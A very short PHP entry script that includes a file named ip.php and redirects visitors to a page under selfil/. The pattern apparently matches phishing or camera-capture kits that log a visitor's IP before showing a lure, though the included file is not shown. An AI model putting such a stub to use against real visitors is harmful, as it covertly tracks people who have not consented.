<?php
include 'ip.php';
header('Location: selfil/index.html');
exit
?>
